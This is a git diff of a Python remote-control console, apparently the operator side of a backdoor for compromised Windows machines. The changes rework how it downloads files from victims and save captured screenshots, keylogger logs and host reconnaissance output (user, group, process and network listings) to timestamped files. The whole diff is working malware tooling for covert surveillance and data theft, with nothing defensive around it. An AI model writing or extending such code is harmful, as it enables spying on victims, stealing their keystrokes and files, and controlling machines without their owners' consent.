@@ -2,6 +2,7 @@ import os
 import base64
 import logging
 import requests
+import datetime
 import argparse
 import subprocess
 import multiprocessing.dummy
@@ -29,7 +30,7 @@ class Shell(object):
    /# =========`-_       +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
   /# (--====___====\     |S|H|O|W| |M|E| |W|H|A|T| |Y|O|U| |G|O|T|
  /#   .- --.  . --.|     +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
-/##   |  * ) (   * ),                   Author: Mr. Poopy Butthole
+/##   |  * ) (   * ),                   Author: Mr. Poopybutthole
 |##   \    /\ \   / |
 |###   ---   \ ---  |
 |####      ___)    #|    Type 'help' for a list of commands
@@ -92,8 +93,8 @@ class Shell(object):
   net user;
   net localgroup;
   net localgroup administrators;
-  get-process;
-  get-service | Sort-Object -Property Status,Name;
+  tasklist;
+  get-service;
   netstat -ano;
   route print;
   ipconfig /displaydns;
@@ -283,13 +284,12 @@ class Shell(object):
       return
     key = ''.join([user, '@', d['ip']])
     try:
-      filename = ''.join([user, '-', d['ip'], '-', d['args']['path']])
-      with open(filename, 'wb') as f:
-        r = self.__r(d['ip'], user, path.encode('UTF-8'), UPLOAD_ID)
+      with open(d['args']['dest'], 'wb') as f:
+        r = self.__r(d['ip'], user, d['args']['path'].encode('UTF-8'), UPLOAD_ID)
         f.write(b''.join([base64.b64decode(c) for c in r]))
-      print('[{0}] SUCCESS - downloaded file {1} as {2}'.format(key, d['args']['path'], filename))
+      print('[{0}] SUCCESS - downloaded file {1} as {2}'.format(key, d['args']['path'], d['args']['dest']))
     except:
-      logging.error('[{0}] failed to download file {1} as {2}'.format(key, d['args']['path'], filename))
+      logging.error('[{0}] failed to download file {1} as {2}'.format(key, d['args']['path'], d['args']['dest']))
 
   def screenshot(self, d):
     if not self.hosts:
@@ -310,7 +310,13 @@ class Shell(object):
     # download screenshot
     logging.info('[{0}] downloading screenshot file _.jpeg ...'.format(key))
     try:
-      self.download(d['ip'], '_.jpeg')
+      self.download({
+        'ip': d['ip'],
+        'args': {
+          'path': '_.jpeg',
+          'dest': 'screenshot_{0}_{1}_{2}.jpeg'.format(user, d['ip'], datetime.datetime.now().strftime("%d-%b-%Y-%M:%H")),
+        }
+      })
     except:
       logging.error('[{0}] failed to download screenshot file: _.jpeg'.format(key))
     # delete screenshot file
@@ -341,7 +347,13 @@ class Shell(object):
     # download log
     logging.info('[{0}] downloading keylogger file _.txt ...'.format(key))
     try:
-      self.download(d['ip'], '_.txt')
+      self.download({
+        'ip': d['ip'],
+        'args': {
+          'path': '_.txt',
+          'dest': 'keylogger_{0}_{1}_{2}.txt'.format(user, d['ip'], datetime.datetime.now().strftime("%d-%b-%Y-%M:%H")),
+        }
+      })
     except:
       logging.error('[{0}] failed to download keylogger file: _.txt'.format(key))
     # delete keylogger file
@@ -366,7 +378,10 @@ class Shell(object):
     logging.info('[{0}] gathering info ...'.format(key))
     try:
       r = self.__r(d['ip'], user, self.INFO_SCRIPT.encode('UTF-16LE'), CMD_ID)
-      print(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
+      filename = 'info_{0}_{1}_{2}.txt'.format(user, d['ip'], datetime.datetime.now().strftime("%d-%b-%Y-%M:%H"))
+      with open(filename, 'w') as f:
+        f.write(''.join([base64.b64decode(c).decode('UTF-8') for c in r]))
+      logging.info('[{0}] data written to {1}'.format(key, filename))
     except:
       logging.error('[{0}] failed to run info script: {0}'.format(key, self.INFO_SCRIPT))
 
@@ -422,9 +437,9 @@ if __name__ == '__main__':
       sh.thread(sh.upload, sh_args[0], {'path':sh_args[1]})
     if c.startswith('download'):
       sh_args = c.replace('download', '').strip().split(' ')
-      if len(sh_args) != 2:
+      if len(sh_args) != 3:
         logging.error('invalid arguments. run "help"')
         continue
-      sh.thread(sh.download, sh_args[0], {'path':sh_args[1]})
+      sh.thread(sh.download, sh_args[0], {'path':sh_args[1], 'dest':sh_args[2]})
     if c in ['e', 'q', 'exit', 'quit']:
       break
